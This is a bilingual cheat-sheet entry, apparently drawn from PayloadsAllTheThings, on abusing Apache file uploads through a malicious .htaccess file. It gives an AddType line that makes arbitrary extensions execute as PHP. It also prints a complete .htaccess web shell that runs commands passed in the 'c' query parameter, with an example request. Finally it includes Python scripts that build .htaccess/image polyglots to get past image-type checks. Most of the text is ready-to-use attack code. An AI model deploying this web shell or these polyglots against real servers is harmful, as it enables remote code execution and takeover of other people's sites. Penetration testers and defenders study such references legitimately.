# Apache .htaccess Upload Bypass - Apache配置文件上传绕过

[SEARCH_KEYWORDS]
漏洞类型: File Upload Bypass 配置文件上传 远程代码执行
攻击类型: Remote Code Execution Webshell Upload
关键词: .htaccess Apache AddType application/x-httpd-php polyglot
技术: AddType Directive Self-Contained htaccess Polyglot Image
工具: htshell
平台: Apache mod_php

[CONTENT]

## .htaccess上传绕过概述

通过上传恶意`.htaccess`文件覆盖Apache规则，可以将任意扩展名的文件作为PHP执行，实现远程代码执行。

## AddType指令绕过

上传`.htaccess`文件:
```apache
AddType application/x-httpd-php .rce
```

然后上传任意`.rce`扩展名的文件即可作为PHP执行。

## Self-Contained .htaccess

完整的.htaccess Web Shell:

```apache
# Self contained .htaccess web shell - Part of the htshell project
# Written by Wireghoul - http://www.justanotherhacker.com

# Override default deny rule to make .htaccess file accessible over web
<Files ~ "^\.ht">
Order allow,deny
Allow from all
</Files>

# Make .htaccess file be interpreted as php file
AddType application/x-httpd-php .htaccess

###### SHELL ######
<?php echo "\n";passthru($_GET['c']." 2>&1"); ?>
```

访问: `http://target.com/.htaccess?c=whoami`

## Polyglot .htaccess

当服务器使用`exif_imagetype`检测图片类型时，创建`.htaccess/图片`多语言文件。

### .htaccess/XBM Polyglot

```python
width = 50
height = 50
payload = '# .htaccess file'

with open('.htaccess', 'w') as htaccess:
    htaccess.write('#define test_width %d\n' % (width, ))
    htaccess.write('#define test_height %d\n' % (height, ))
    htaccess.write(payload)
```

### .htaccess/WBMP Polyglot

```python
type_header = b'\x00'
fixed_header = b'\x00'
width = b'50'
height = b'50'
payload = b'# .htaccess file'

with open('.htaccess', 'wb') as htaccess:
    htaccess.write(type_header + fixed_header + width + height)
    htaccess.write(b'\n')
    htaccess.write(payload)
```

原理: `.htaccess`忽略以`\x00`和`#`开头的行。

## 支持的图片类型

- X BitMap (XBM)
- WBMP (Wireless Application Protocol Bitmap Format)

## 参考文档

原始来源: PayloadsAllTheThings/Upload Insecure Files/Configuration Apache .htaccess/README.md